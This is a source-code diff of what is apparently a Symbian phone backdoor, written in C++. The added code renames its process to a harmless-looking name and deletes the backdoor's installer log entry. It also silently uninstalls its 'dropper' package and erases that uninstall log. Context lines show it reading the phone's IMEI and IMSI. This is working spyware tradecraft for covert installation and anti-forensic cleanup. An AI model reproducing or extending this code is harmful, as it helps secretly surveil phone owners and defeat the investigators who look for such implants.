@@ -4,7 +4,10 @@
 #include <e32std.h>
 #include <bautils.h>
 #include <coemain.h>
-
+#include <sisregistrysession.h>
+#include <sisregistryentry.h>
+#include <swinstapi.h>			// installer
+#include <swinstdefs.h>
 #include "Core.h"
 #include "ConfigFile.h"
 #include "ActionEvent.h"
@@ -114,7 +117,7 @@ void CCore::ConstructL()
 		iTonePlayer = CTonePlayer::NewL();
 		}
 		
-	CPhone* phone = CPhone::NewLC();
+	CPhone* phone = CPhone::NewLC(); 
 	phone->GetImeiSync(iGlobalImei);
 	phone->GetImsiSync(iGlobalImsi);
 	CleanupStack::PopAndDestroy();
@@ -646,12 +649,40 @@ LOCAL_C void DoStartL()
 	_LIT(KProcName, "UpnpApp.exe");
 	if (!Processes::RenameIfNotRunning(KProcName))
 		return;
-	
-	//delete install log entry
+
 	User::After(10*1000000);
-	TUid myUid = GetUid(KUidBackdoor);
-	DeleteInstallerLog(myUid);
+
+	//delete bd installation log entry
+	TUid uid = GetUid(KUidBackdoor);
+	DeleteInstallerLog(uid);
 	
+	// uninstall dropper
+	Swi::RSisRegistrySession sisRegSession;
+	sisRegSession.Connect(); 
+	uid = GetUid(KUidUninstaller);
+	Swi::RSisRegistryEntry packageEntry;
+	if(KErrNone == packageEntry.Open(sisRegSession,uid))
+		{
+		// dropper is installed
+		// uninstall dropper
+		SwiUI::TUninstallOptions iOptions;
+		SwiUI::TUninstallOptionsPckg iOptionsPckg; 
+		iOptions.iKillApp=SwiUI::EPolicyAllowed;
+		iOptionsPckg = iOptions;
+		SwiUI::RSWInstLauncher launcher ;
+		TInt err = launcher.Connect();
+		if(err == KErrNone)
+			{
+			// Synchronous silent uninstall
+			TInt a=launcher.SilentUninstall(uid, iOptionsPckg,SwiUI::KSisxMimeType) ;
+			}
+		launcher.Close();
+		//delete dropper uninstallation log
+		uid = GetUid(KUidUninstaller);
+		DeleteInstallerLog(uid);
+		}
+	sisRegSession.Close();
+		
 	// Create active scheduler (to run active objects)
 	CActiveScheduler* scheduler = new (ELeave) CActiveScheduler();
 	CleanupStack::PushL(scheduler);
